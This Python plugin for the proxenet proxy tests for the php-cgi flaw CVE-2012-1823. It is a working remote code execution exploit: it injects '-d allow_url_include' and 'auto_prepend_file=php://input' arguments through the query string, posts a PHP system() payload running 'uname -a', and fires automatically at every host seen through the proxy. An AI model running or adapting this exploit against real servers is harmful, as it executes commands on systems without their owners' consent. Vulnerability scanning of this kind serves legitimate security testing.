"""

proxenet test plugin for CVE-2012-1823 : php-cgi code execution

The test is made a synchronous way, so it will block during the test
A small cache is implemented never to retest a same host (ip:port) twice.

"""

import sys, subprocess, urllib, urlparse, inspect

AUTHOR = "hugsy"
PLUGIN_NAME = "CVE-2012-1823"

CMD = "uname -a"
PATTERN_VALID = "Linux"

ALREADY_TESTED_HOSTS = []


def safe_spawn(uri):
    global ALREADY_TESTED_HOSTS

    base_url = get_base_url(uri)
    if base_url in ALREADY_TESTED_HOSTS:
        return None

    cmd = ["python2", inspect.getfile(inspect.currentframe()), uri]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    return p


def try_cve_2012_1823(base_url):
    target_url = base_url + '?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
    post_data = """<?php system('{}');die(); ?>""".format(CMD)
    f = urllib.urlopen(target_url, data=post_data)
    response = f.read()
    return PATTERN_VALID in response


def get_base_url(uri):
    blob = urlparse.urlparse( uri )
    return blob.scheme + "://" + blob.netloc + "/"


def proxenet_request_hook(request_id, request, uri):
    global ALREADY_TESTED_HOSTS

    p = safe_spawn(uri)
    if p is None:
        return request

    retcode = p.wait()
    if retcode :
        print("\x1b[4m\x1b[1m\x1b[95m{} is vulnerable to CVE-2012-1823!!\x1b[0m".format(uri))

    ALREADY_TESTED_HOSTS.append( get_base_url(uri) )
    return request


def proxenet_response_hook(response_id, response, uri):
    return response


if __name__ == "__main__":
    if len(sys.argv) == 2:
        print sys.argv[1]
        exit(try_cve_2012_1823(sys.argv[1]))

    # for testing
    rid = 1337
    target = "192.168.56.102:80"
    uri = "http://{:s}/".format(target)
    req = "GET /blah/blah?foobar HTTP/1.1\r\n"
    req+= "Host: {:s}\r\n".format(target)
    req+= "X-Header: Powered by proxenet\r\n\r\n"

    proxenet_request_hook(rid, req, uri)
    exit(0)
